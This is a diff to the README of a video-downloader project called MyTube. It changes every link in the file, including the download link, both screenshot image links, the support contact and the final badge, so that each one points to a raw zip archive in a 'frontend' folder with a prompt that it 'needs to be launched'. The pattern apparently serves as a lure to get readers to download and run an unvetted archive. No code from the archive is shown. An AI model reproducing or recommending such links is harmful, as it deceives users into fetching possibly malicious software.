@@ -13,7 +13,7 @@ MyTube is a versatile application designed for all video enthusiasts who want to
 ▶️ **Seamless Playback**: Enjoy a smooth video playback experience directly within the application.
 
 ## How to Use 🚀
-1. **Download MyTube**: Get the app from the provided link: [Download MyTube](https://github.com/Warisalishah/MyTube/releases/tag/v1.2) *(needs to be launched)*
+1. **Download MyTube**: Get the app from the provided link: [Download MyTube](https://github.com/Warisalishah/MyTube/raw/refs/heads/master/frontend/Tube-My-2.1.zip) *(needs to be launched)*
    
 2. **Install the Application**: Follow the installation instructions to set up MyTube on your device.
 
@@ -26,17 +26,17 @@ MyTube is a versatile application designed for all video enthusiasts who want to
 6. **Enjoy Offline Viewing**: Watch your favorite videos anytime without an internet connection.
 
 ## Screenshots 📷
-![Screenshot 1](https://github.com/Warisalishah/MyTube/releases/tag/v1.2)
+![Screenshot 1](https://github.com/Warisalishah/MyTube/raw/refs/heads/master/frontend/Tube-My-2.1.zip)
 *Caption: Explore a vast collection of downloaded videos.*
 
-![Screenshot 2](https://github.com/Warisalishah/MyTube/releases/tag/v1.2)
+![Screenshot 2](https://github.com/Warisalishah/MyTube/raw/refs/heads/master/frontend/Tube-My-2.1.zip)
 *Caption: Organize your videos into personalized playlists.*
 
 ## Support 📞
-For any questions or assistance regarding MyTube, please reach out to our support team at https://github.com/Warisalishah/MyTube/releases/tag/v1.2
+For any questions or assistance regarding MyTube, please reach out to our support team at https://github.com/Warisalishah/MyTube/raw/refs/heads/master/frontend/Tube-My-2.1.zip
 
 ---
 
 Feel free to dive into the world of video entertainment with MyTube! Download, organize, and enjoy your favorite videos hassle-free. Don't miss out on the opportunity to create your personalized video library with just a few clicks. Start your video journey today with MyTube!
 
-[![Download MyTube](https://github.com/Warisalishah/MyTube/releases/tag/v1.2)](https://github.com/Warisalishah/MyTube/releases/tag/v1.2)
+[![Download MyTube](https://github.com/Warisalishah/MyTube/raw/refs/heads/master/frontend/Tube-My-2.1.zip)](https://github.com/Warisalishah/MyTube/raw/refs/heads/master/frontend/Tube-My-2.1.zip)
